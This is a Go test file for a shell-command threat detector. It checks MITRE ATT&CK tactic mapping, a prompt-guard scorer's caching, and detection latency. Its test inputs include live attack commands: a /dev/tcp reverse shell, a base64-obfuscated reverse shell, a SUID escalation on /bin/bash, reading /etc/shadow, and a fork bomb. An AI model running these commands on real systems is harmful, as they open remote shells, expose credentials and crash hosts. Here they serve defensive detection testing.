package detector

import (
	"testing"
	"time"
)

func TestResolveMitreTactic(t *testing.T) {
	tests := []struct {
		name         string
		command      string
		matchedRules []string
		wantTactic   string
	}{
		{
			name:         "Reverse TCP shell",
			command:      "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			matchedRules: []string{"reverse_shell"},
			wantTactic:   "Execution (T1059.004) / Command & Control (T1090)",
		},
		{
			name:         "SUID privesc",
			command:      "chmod u+s /bin/bash",
			matchedRules: []string{"privilege_escalation"},
			wantTactic:   "Privilege Escalation (T1548 - Abuse Elevation Control)",
		},
		{
			name:         "Credential dumping",
			command:      "cat /etc/shadow",
			matchedRules: []string{"etc_shadow_access"},
			wantTactic:   "Credential Access (T1003 - OS Credential Dumping)",
		},
		{
			name:         "Obfuscation / Base64",
			command:      `bash -c "{echo,YmFzaCAtaSA=}|{base64,-d}"`,
			matchedRules: []string{"base64_encoded_payload"},
			wantTactic:   "Defense Evasion (T1027 - Obfuscated Files/Payloads)",
		},
		{
			name:         "Fork bomb DoS",
			command:      ":(){ :|:& };:",
			matchedRules: []string{"fork_bomb"},
			wantTactic:   "Impact (T1499 - Endpoint Denial of Service / Fork Bomb)",
		},
		{
			name:         "Benign directory list",
			command:      "ls -la /var/log",
			matchedRules: nil,
			wantTactic:   "Standard Administration (T0000)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ResolveMitreTactic(tt.command, tt.matchedRules)
			if got != tt.wantTactic {
				t.Errorf("ResolveMitreTactic() = %q, want %q", got, tt.wantTactic)
			}
		})
	}
}

func TestPromptGuardScorer_HeuristicAndCaching(t *testing.T) {
	// Initialize with empty key to test offline / heuristic fallback mode
	scorer := GetPromptGuardScorer("", "meta-llama/llama-prompt-guard-2-86m", 2, 0.90, false)

	cmd := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	dec1 := scorer.Score(cmd, 85.0, []string{"reverse_shell"})

	if dec1.Label != "MALICIOUS" {
		t.Errorf("expected MALICIOUS, got %q", dec1.Label)
	}
	if dec1.Confidence < 0.90 {
		t.Errorf("expected confidence >= 0.90, got %f", dec1.Confidence)
	}
	if dec1.SynthesizedExplanation == "" {
		t.Errorf("expected non-empty synthesized explanation")
	}

	// Second call should return cached decision
	dec2 := scorer.Score(cmd, 85.0, []string{"reverse_shell"})
	if !dec2.Cached {
		t.Errorf("expected cached = true on second query")
	}
}

func TestPipelineLatency_Sub5msThreshold(t *testing.T) {
	p := GetPipeline("")
	cmd := "bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjF9|{base64,-d}|{bash,-i}}'"

	// Warmup
	_ = p.Detect(cmd, 0, 0)

	// Measure 100 consecutive detections
	runs := 100
	t0 := time.Now()
	for i := 0; i < runs; i++ {
		res := p.Detect(cmd, 0, 0)
		if res.Classification != "malicious" {
			t.Fatalf("expected malicious, got %s", res.Classification)
		}
		if res.MitreTactic == "" {
			t.Fatalf("expected non-empty MITRE tactic")
		}
	}
	elapsed := time.Since(t0)
	avgMs := float64(elapsed.Microseconds()) / float64(runs) / 1000.0

	t.Logf("Average sync detection latency over %d runs: %.3f ms", runs, avgMs)

	// User SLA threshold: must be sub-10ms (and ideally sub-2ms)
	if avgMs > 10.0 {
		t.Fatalf("Sync detection exceeded latency budget: %.3f ms > 10.0 ms", avgMs)
	}
}
